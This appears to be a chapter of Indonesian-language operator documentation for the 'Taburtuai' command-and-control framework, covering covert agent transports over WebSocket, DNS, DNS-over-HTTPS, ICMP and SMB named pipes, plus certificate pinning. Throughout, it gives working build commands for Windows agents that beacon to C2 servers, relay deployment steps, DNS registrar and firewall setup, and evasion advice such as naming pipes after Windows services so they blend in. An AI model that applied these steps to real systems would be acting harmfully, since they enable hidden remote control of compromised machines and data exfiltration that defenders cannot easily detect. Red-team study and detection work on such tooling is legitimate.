# 19 — Advanced C2 Transports: WebSocket, DNS, DoH, ICMP, SMB Named Pipe

> Transport alternatif untuk situasi di mana HTTP/HTTPS polling ke server C2 diblokir,
> mudah dideteksi, atau membutuhkan latensi lebih rendah. Setiap transport memanfaatkan
> protokol yang berbeda sebagai covert channel.

---

## Ringkasan Transport

| Transport | Protokol | Port | Kapan Dipakai | Build Target |
|-----------|----------|------|---------------|--------------|
| HTTP/HTTPS | TCP 80/443 | Bebas | Default | `agent-win-stealth` |
| **WebSocket** | **TCP (HTTP Upgrade)** | **8081** | **Perlu push command / low latency** | **`agent-win-ws`** |
| **DNS Authoritative** | **UDP DNS** | **5353** | **Hanya DNS keluar, kontrol domain** | **`agent-win-dns`** |
| DNS-over-HTTPS | HTTPS ke DNS resolver publik | 443 | Hanya DNS keluar diizinkan | `agent-win-doh` |
| ICMP | ICMP Echo | — | TCP diblokir total | `agent-win-icmp` |
| SMB Named Pipe | SMB 445 | — | Pivot internal, mesin tanpa internet | `agent-win-smb` |

---

## Transport 0: WebSocket (Persistent Push)

### Cara Kerja

Agent membuka **satu koneksi WebSocket persisten** ke server C2. Alih-alih polling
setiap N detik, server langsung **mendorong (push) command** begitu operator
mengantrekan perintah. Hasilnya:

- **Latensi ≤1 detik** — command sampai ke agent dalam ~1 detik setelah diqueue
- **Tidak ada polling pattern** — traffic terlihat seperti WebSocket app biasa (chat, dashboard)
- **Firewall-friendly** — berjalan di port TCP yang sama; bisa di-proxy via Nginx/Caddy

```
Agent                                      C2 Server (:8081)
  │                                              │
  │  GET /ws  HTTP/1.1  (Upgrade: websocket)    │
  │ ──────────────────────────────────────────► │
  │  101 Switching Protocols                    │
  │ ◄────────────────────────────────────────── │
  │                                              │
  │  {"type":"checkin","id":"...","data":{...}} │  ← Agent kirim checkin
  │ ──────────────────────────────────────────► │
  │  {"type":"noop","data":{...}}               │  ← Server ack + config
  │ ◄────────────────────────────────────────── │
  │                                              │
  │  [koneksi tetap terbuka]                    │
  │                                              │
  │  {"type":"command","data":{...}}            │  ← Server push command kapanpun
  │ ◄────────────────────────────────────────── │
  │  {"type":"result","data":{...}}             │  ← Agent kirim hasil
  │ ──────────────────────────────────────────► │
  │  {"type":"noop"}                            │  ← Keepalive tiap 25s
  │ ◄────────────────────────────────────────── │
```

### Protocol Framing

Semua pesan menggunakan JSON envelope:

```json
{ "type": "checkin|result|command|noop|error",
  "id":   "<agent_id atau cmd_id>",
  "data": <JSON payload> }
```

| `type` | Arah | Isi `data` |
|--------|------|------------|
| `checkin` | Agent → Server | AgentInfo (hostname, OS, dll) |
| `result` | Agent → Server | CommandResult (output, cmd_id) |
| `command` | Server → Agent | Command struct (diqueue oleh operator) |
| `noop` | Dua arah | Keepalive / ack kosong |
| `error` | Server → Agent | Pesan error string |

### Setup Server

```bash
# Aktifkan WS listener di port 8081
./bin/server --ws --ws-port 8081

# Kombinasi HTTPS + WS sekaligus
./bin/server --tls --tls-port 8443 --ws --ws-port 8081

# Via env vars
WS_ENABLED=true WS_PORT=8081 ./bin/server
```

**Output startup:**
```
   bind       0.0.0.0:8080
   tls        disabled
   ws         enabled  :8081
   ...

  [✓]  ready  ·  listening on 0.0.0.0:8080
  [✓]  WebSocket listener  ·  ws://0.0.0.0:8081/ws
```

### Setup Firewall

```bash
# Buka port WS di server Linux
sudo ufw allow 8081/tcp comment "Taburtuai WS"
sudo ufw reload
```

### Build Agent dengan WebSocket Transport

```bash
make agent-win-ws \
  C2_SERVER=http://c2.corp.local:8080 \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=ws

# Dengan WS port custom
make agent-win-ws \
  C2_SERVER=http://c2.corp.local:8080 \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=ws \
  WS_SERVER_URL=ws://c2.corp.local:8081/ws
```

> **Catatan:** `C2_SERVER` tetap diisi URL HTTP untuk fallback dan profile.
> `WS_SERVER_URL` adalah endpoint WebSocket eksplisit. Jika tidak diset,
> agent otomatis menurunkan dari `C2_SERVER` (`http://` → `ws://`, tambah `/ws`).

### Semua Flag WS Agent

| Makefile Var | Default | Fungsi |
|---|---|---|
| `TRANSPORT=ws` | wajib | Aktifkan WS transport |
| `WS_SERVER_URL` | auto-derive | Endpoint `ws://host:port/ws` eksplisit |

### Nginx Reverse Proxy untuk WS

Jika menggunakan Nginx di depan server:

```nginx
# /etc/nginx/sites-available/c2
server {
    listen 443 ssl;
    server_name c2.yourdomain.com;

    ssl_certificate     /etc/ssl/c2.crt;
    ssl_certificate_key /etc/ssl/c2.key;

    # HTTP API
    location /api/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
    }

    # WebSocket — penting: Upgrade header harus diteruskan
    location /ws {
        proxy_pass http://127.0.0.1:8081;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 3600s;   # jangan timeout koneksi WS yang idle
        proxy_send_timeout 3600s;
    }
}
```

**Build agent arahkan ke HTTPS/WSS:**
```bash
make agent-win-ws \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=ws \
  WS_SERVER_URL=wss://c2.yourdomain.com/ws
```

### Reconnect Otomatis

Jika koneksi WS terputus (restart server, network blip), agent secara otomatis:
1. Menunggu 5 detik
2. Reconnect ke WS endpoint
3. Mengirim ulang checkin
4. Melanjutkan polling command

### Perbandingan HTTP vs WebSocket

| Aspek | HTTP Polling | WebSocket |
|-------|-------------|-----------|
| Latensi command | Interval beacon (default 30s) | ≤1 detik |
| Traffic pattern | Burst periodic (detectable) | Persistent stream |
| Network overhead | Header HTTP per request | Minimal frame overhead |
| Firewall/proxy | Semua port | Port TCP (sama), perlu `Upgrade` support |
| Reconnect | Otomatis (loop) | Otomatis (5s delay) |
| Enkripsi | Via AES-GCM payload | Via AES-GCM payload (+ TLS opsional) |

---

## Transport 1: DNS Authoritative Listener

### Cara Kerja

Agent mengirim data sebagai **DNS TXT query** langsung ke C2 server yang berperan sebagai
**authoritative DNS server** untuk domain yang dikuasai. Server menjawab dengan TXT record
berisi command.

Berbeda dengan DoH (yang via resolver publik), DNS authoritative menggunakan **UDP langsung
dari agent ke server** — tidak ada perantara. Agent mendial server C2 di port 5353 (atau
port 53 untuk produksi).

```
Agent                                          C2 Server (:5353 UDP)
  │                                                 │
  │  DNS TXT Query                                  │
  │  <base32(checkin-json)>.c2.yourdomain.com       │
  │────────────────────────────────────────────────►│
  │                                                 │  dispatch() → OnCheckin
  │  DNS TXT Response                               │
  │  TXT: <base32({"s":"ok"})>                      │
  │◄────────────────────────────────────────────────│
  │                                                 │
  │  DNS TXT Query (poll)                           │
  │  <base32({"t":"p","a":"agent-id"})>.c2.dom      │
  │────────────────────────────────────────────────►│
  │                                                 │  OnPoll → CommandQueue
  │  DNS TXT Response                               │
  │  TXT: <base32(command-json)>                    │
  │◄────────────────────────────────────────────────│
```

### Protocol Framing

Setiap DNS query membawa **JSON envelope yang di-encode base32 no-padding** (DNS-safe):

```json
{ "t": "c|r|p",    ← c=checkin, r=result, p=poll
  "a": "<agent-id>",
  "d": <payload>   ← JSON body (checkin info, command result, dll)
}
```

Payload di-split ke label-label 63 karakter (max DNS label) dan disambung dengan titik.

### Setup Server

```bash
# Aktifkan DNS listener (UDP port 5353, zone c2.example.com)
./bin/server --dns --dns-domain c2.example.com

# Port produksi (53) — butuh root/CAP_NET_BIND_SERVICE di Linux
sudo ./bin/server --dns --dns-port 53 --dns-domain c2.example.com

# Kombinasi HTTP + DNS
./bin/server --dns --dns-domain c2.example.com --dns-port 5353

# Via env vars
DNS_ENABLED=true DNS_DOMAIN=c2.example.com DNS_PORT=5353 ./bin/server
```

**Output startup:**
```
   bind       0.0.0.0:8080
   dns        enabled  :5353  zone=c2.example.com
   ...

  [✓]  DNS listener  ·  udp://0.0.0.0:5353  zone=c2.example.com
```

### Konfigurasi DNS Registrar

Di registrar domain Anda, buat:

| Nama | Tipe | Value | TTL |
|------|------|-------|-----|
| `c2.yourdomain.com` | NS | `ns1.yourdomain.com` | 300 |
| `ns1.yourdomain.com` | A | `IP_C2_SERVER` | 300 |

Kemudian server C2 menjadi authoritative NS untuk zone `c2.yourdomain.com`.

Untuk test:
```bash
# Query langsung ke server (sebelum NS propagation)
dig @IP_C2_SERVER -p 5353 poll.c2.yourdomain.com TXT

# Query via DNS publik (setelah NS propagation)
dig @8.8.8.8 poll.c2.yourdomain.com TXT
```

### Build Agent DNS

```bash
make agent-win-dns \
  C2_SERVER=http://c2.yourdomain.com:8080 \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=dns \
  DNS_DOMAIN=c2.yourdomain.com \
  DNS_SERVER=IP_C2_SERVER:5353 \
  INTERVAL=60 \
  JITTER=30
```

| Makefile Var | Default | Fungsi |
|---|---|---|
| `TRANSPORT=dns` | wajib | Aktifkan DNS transport |
| `DNS_DOMAIN` | wajib | Zone yang dikuasai (e.g. `c2.yourdomain.com`) |
| `DNS_SERVER` | host dari `C2_SERVER`:5353 | Alamat server DNS eksplisit `host:port` |

### Firewall

```bash
# Buka UDP 5353 di server
sudo ufw allow 5353/udp comment "Taburtuai DNS"

# Produksi port 53
sudo ufw allow 53/udp comment "Taburtuai DNS prod"
```

### Karakteristik DNS Authoritative

| Aspek | Detail |
|-------|--------|
| Protocol | UDP (connectionless) |
| Port | 5353 (dev) / 53 (prod) |
| Payload max | ~180 bytes per query (setelah base32 + label splitting) |
| Throughput | Rendah — cocok command, tidak untuk file transfer |
| Deteksi | Traffic DNS ke domain sendiri: wajar, sulit diblokir |
| VS DoH | Langsung ke server (tidak ada perantara resolver publik) |

---

## Transport 1.5: DNS-over-HTTPS (DoH)

### Cara Kerja

Payload di-encode ke dalam DNS TXT queries yang dikirim ke resolver publik
(Cloudflare atau Google) melalui HTTPS. Resolver meneruskan DNS query ke server
C2 yang berfungsi sebagai authoritative DNS server untuk domain yang dikuasai.

```
Agent                Cloudflare DoH Resolver         C2 Server
  │                        │                              │
  │  HTTPS POST            │                              │
  │  dns-query?name=       │                              │
  │   data.chunk1.c2.com   │                              │
  │  &type=TXT             │                              │
  │───────────────────────►│                              │
  │                        │  DNS query: data.chunk1.c2.com TXT?
  │                        │─────────────────────────────►│
  │                        │                              │ return TXT record
  │                        │  TXT: "ack:ok"               │ (isi command/ack)
  │                        │◄─────────────────────────────│
  │  HTTPS 200: TXT data   │                              │
  │◄───────────────────────│                              │
```

### Format Encoding

- Payload di-split per 63 karakter (max DNS label length)
- Setiap chunk di-encode base32 (DNS-safe charset)
- Format: `<chunk>.<session-id>.<c2-domain>`
- Poll: `poll.<session-id>.<c2-domain>` TXT query

### Build Agent DoH

```bash
# Daftarkan domain ke C2 server sebagai authoritative NS
# Di registrar: ns1.c2domain.com → IP_C2_SERVER

make agent-win-doh \
  C2_SERVER=c2domain.com \
  ENC_KEY=DoHSecretKey2026 \
  TRANSPORT=doh \
  DOH_PROVIDER=cloudflare \
  INTERVAL=120 \
  JITTER=40
```

**Output:**
```
[*] Building Windows DoH agent...
    C2 Domain    : c2domain.com
    DoH Provider : cloudflare (cloudflare-dns.com/dns-query)
    Interval     : 120s  Jitter: 40%
[+] Agent: bin/agent_windows_doh.exe (9.1 MB)
```

### Pilih Provider DoH

| Provider | Endpoint | Keterangan |
|----------|----------|------------|
| `cloudflare` | `cloudflare-dns.com/dns-query` | Paling umum, sulit diblokir |
| `google` | `dns.google/resolve` | Alternatif, port 443 ke Google |

```bash
make agent-win-doh DOH_PROVIDER=google C2_SERVER=c2domain.com ENC_KEY=...
```

### Setup Server (Authoritative DNS)

Server C2 harus dikonfigurasi sebagai authoritative DNS server untuk domain:

```bash
# Contoh konfigurasi minimal (server sudah handle DNS via internal resolver)
# Agent akan dapat TXT record berisi payload terenkripsi

# Test resolusi TXT dari luar
dig @8.8.8.8 poll.sessionabc123.c2domain.com TXT
# Harusnya return TXT record dari C2 server
```

### Karakteristik DoH

- Traffic: HTTPS ke `1.1.1.1:443` (Cloudflare) — terlihat normal
- Payload size: terbatas oleh max DNS label/TXT record length
- Latency: lebih tinggi dari HTTP (multiple DNS round-trips per payload chunk)
- Deteksi: sangat sulit — HTTPS ke trusted resolver publik
- Firewall bypass: 99.9% jaringan enterprise izinkan HTTPS ke `1.1.1.1`

---

## Transport 2: ICMP Echo

### Cara Kerja

Payload disisipkan di ICMP echo request dan reply payload. Agent menggunakan
`IcmpSendEcho2` Windows API (dari `iphlpapi.dll`) — tidak butuh raw socket
atau privilege administrator.

```
Agent                                       C2 Server
  │                                              │
  │  ICMP Echo Request                           │
  │  payload: [MAGIC:TBUC][seq][total][idx][data]│
  │─────────────────────────────────────────────►│
  │                                              │
  │  ICMP Echo Reply                             │
  │  payload: [MAGIC:TBUC][seq][total][idx][data]│
  │◄─────────────────────────────────────────────│
```

### Frame Format

```
Bytes 0-3  : Magic "TBUC" (0x54425543) — penanda frame Taburtuai
Bytes 4-5  : Sequence number (uint16, little-endian)
Bytes 6-7  : Total chunks (uint16)
Byte  8    : Chunk index
Bytes 9+   : Encrypted payload data
```

### Build Agent ICMP

```bash
make agent-win-icmp \
  C2_SERVER=203.0.113.50 \
  ENC_KEY=IcmpC2Key2026 \
  TRANSPORT=icmp \
  INTERVAL=120 \
  JITTER=30
```

**Output:**
```
[*] Building Windows ICMP agent (Windows-only transport)...
    Server IP : 203.0.113.50
    Interval  : 120s  Jitter: 30%
[+] Agent: bin/agent_windows_icmp.exe (8.7 MB)
```

> **Catatan:** ICMP transport hanya tersedia di agent Windows.
> Build ini tidak berfungsi di Linux/macOS.

### Setup Server untuk ICMP

C2 server perlu bisa menerima ICMP dan memiliki IP publik yang bisa di-ping dari target.
Server tidak perlu konfigurasi khusus — ICMP handler dibangun ke dalam binary server.

```bash
# Pastikan ICMP tidak diblokir di firewall VPS
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT
```

### Karakteristik ICMP

- Tidak ada TCP/UDP connection (sulit dideteksi firewall stateful)
- Beberapa jaringan blokir outbound ICMP — test dulu dengan `ping`
- Throughput rendah — cocok untuk command, tidak untuk transfer file besar
- Deteksi: payload analysis pada ICMP bisa mendeteksi data di luar echo pattern normal
- **Tidak butuh admin** — menggunakan `IcmpSendEcho2` bukan raw socket

---

## Transport 3: SMB Named Pipe

### Cara Kerja

Agent terhubung ke named pipe di **relay host** (mesin perantara yang bisa akses
SMB internal). Relay mem-proxy pesan ke C2 server melalui HTTPS.

```
                     ┌── Internal Network ──┐
Agent (no internet)  │                      │  DMZ/Relay Host      C2 Server
    │                │                      │      │                    │
    │  SMB connect   │                      │      │                    │
    │  \\relay\pipe\ │                      │      │                    │
    │  svcctl        │                      │      │                    │
    │────────────────────────────────────── ►│      │                    │
    │                │                      │      │  HTTPS POST        │
    │                │                      │      │──────────────────► │
    │                │                      │      │                    │  process
    │                │                      │      │  HTTPS 200         │
    │                │                      │      │◄────────────────── │
    │  SMB response  │                      │      │                    │
    │◄────────────────────────────────────── │      │                    │
```

### Frame Format SMB

```
Bytes 0-3  : Magic "TBUP" (0x54425550) — penanda frame
Byte  4    : Type (0x01=send, 0x02=poll, 0x03=response)
Bytes 5-8  : Payload length (uint32, little-endian)
Bytes 9+   : Encrypted payload
```

### Setup Relay (smb_relay.exe)

Deploy relay binary di mesin DMZ yang bisa reach ke internal network via SMB:

```bash
# Build relay binary
make smb-relay
# Output: bin/smb_relay.exe

# Deploy ke relay host (via RDP, file share, atau agent lain)
# Jalankan di relay host:
.\smb_relay.exe \
  --pipe svcctl \
  --c2 https://c2.yourdomain.com \
  --key EnterpriseC2Key2026 \
  --instances 10
```

**Output relay:**
```
[*] SMB Named Pipe Relay starting...
[*] Pipe   : \\.\pipe\svcctl
[*] C2     : https://c2.yourdomain.com
[*] Workers: 10 simultaneous connections
[+] Listening on \\.\pipe\svcctl
[+] Ready to proxy connections to C2.
```

### Build Agent SMB

```bash
make agent-win-smb \
  ENC_KEY=EnterpriseC2Key2026 \
  TRANSPORT=smb \
  SMB_RELAY=10.10.5.20 \
  SMB_PIPE=svcctl \
  INTERVAL=60 \
  JITTER=20
```

**Output:**
```
[*] Building Windows SMB agent...
    Relay host : 10.10.5.20
    Pipe name  : svcctl
    Interval   : 60s  Jitter: 20%
[+] Agent: bin/agent_windows_smb.exe (8.9 MB)
```

### Konfigurasi OPSEC untuk SMB

**Nama pipe yang bagus (menyatu dengan Windows):**
- `svcctl` — Service Control Manager
- `srvsvc` — Server Service
- `samr` — Security Account Manager RPC
- `lsarpc` — Local Security Authority RPC
- `browser` — Computer Browser

```bash
# Gunakan nama pipe yang legitimate
make agent-win-smb SMB_PIPE=svcctl SMB_RELAY=10.10.5.20 ENC_KEY=...
```

### Karakteristik SMB

- Memanfaatkan SMB yang sering diizinkan di jaringan internal
- Tidak perlu internet di agent — cocok untuk air-gapped internal network
- Butuh relay host dengan akses ke C2 internet
- Deteksi: SMB ke host internal adalah traffic normal

---

## Certificate Pinning (Agent)

Agent dapat divalidasi bahwa ia sedang berkomunikasi dengan server C2 yang benar,
bukan proxy/MITM, dengan mem-pin SHA-256 fingerprint TLS leaf certificate server.

### Cara Kerja

Saat TLS handshake, agent membandingkan SHA-256 dari raw bytes sertifikat server
dengan fingerprint yang di-bake saat build. Jika tidak cocok → connection ditolak.

### Dapatkan Fingerprint Server

```bash
# Dari file cert (jika pakai --tls-cert)
openssl x509 -in server.crt -fingerprint -sha256 -noout
# SHA256 Fingerprint=AA:BB:CC:...

# Dari live server
openssl s_client -connect c2.yourdomain.com:8443 </dev/null 2>/dev/null \
  | openssl x509 -fingerprint -sha256 -noout
# SHA256 Fingerprint=AA:BB:CC:...

# Format hex tanpa titik dua (keduanya diterima agent)
echo "AA:BB:CC:DD:..." | tr -d ':' | tr '[:upper:]' '[:lower:]'
# aabbccdd...
```

### Build Agent dengan Cert Pin

```bash
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com:8443 \
  ENC_KEY=K3yRah4sia \
  CERT_PIN=aabbcc...64hexchars... \
  --tls
```

| Makefile Var | Format | Keterangan |
|---|---|---|
| `CERT_PIN` | 64 hex chars atau `AA:BB:...` 32 colon-pairs | SHA-256 fingerprint leaf cert |

### Perilaku saat Mismatch

```
[!] TLS error: cert pin: fingerprint mismatch
```
Agent menolak koneksi dan retry sesuai beacon interval. Tidak ada data yang terkirim.

### Catatan

- Pin pada **leaf certificate** (bukan CA chain)
- Jika cert diregenerasi (server restart dengan auto-gen), pin lama akan gagal → regenerasi agent
- Untuk HTTPS dengan cert statis (`--tls-cert`), pin cert tidak akan berubah
- Jika `CERT_PIN` kosong, tidak ada pinning (default — TLS tetap digunakan, tidak diverifikasi)

---

## Perbandingan Semua Transport

| Aspek | HTTP/HTTPS | WebSocket | DNS | DoH | ICMP | SMB |
|-------|-----------|-----------|-----|-----|------|-----|
| Butuh internet di agent | Ya | Ya | Ya | Ya | Ya | Tidak |
| Port yang dipakai | 80/443 | 8081 | 5353/53 | 443 | — | 445 |
| Bypass egress filter | Tidak | Tidak | Ya (DNS) | Ya (DNS via HTTPS) | Ya (ICMP) | Ya (internal SMB) |
| Throughput | Tinggi | Tinggi | Rendah | Rendah | Sangat rendah | Sedang |
| Latency | Rendah | ≤1 detik | Sedang | Tinggi | Sedang | Rendah |
| Deteksi kesulitan | Sedang | Sedang | Tinggi | Sangat tinggi | Tinggi | Tinggi |
| Platform agent | Win/Lin/Mac | Win/Lin/Mac | Win/Lin/Mac | Win/Lin/Mac | Windows only | Windows only |
| Setup kompleksitas | Rendah | Rendah | Sedang (butuh domain) | Sedang | Rendah | Tinggi (butuh relay) |

---

## Pilih Transport yang Tepat

```
Apakah mesin target punya akses TCP ke internet?
│
├── Ya + Butuh latensi rendah? → WebSocket (--ws, push ≤1s)
│
├── Ya + Command biasa?        → HTTP/HTTPS (default)
│
└── Terbatas / Tidak
    │
    ├── Apakah DNS UDP ke server sendiri diizinkan?
    │   └── Ya + Punya domain? → DNS Authoritative (--dns, langsung ke server)
    │
    ├── Apakah HTTPS ke resolver publik (1.1.1.1) diizinkan?
    │   └── Ya → DoH (DNS-over-HTTPS, via Cloudflare/Google)
    │
    ├── Apakah ICMP outbound diizinkan?
    │   └── Ya → ICMP (Windows only)
    │
    └── Internal network only (no internet at all)
        └── Apakah ada relay host via SMB di DMZ?
            ├── Ya → SMB Named Pipe (Windows only)
            └── Tidak → Physical access required
```

---

**Selanjutnya:** [20 — Multi-Operator Team Server](20-teamserver.md)
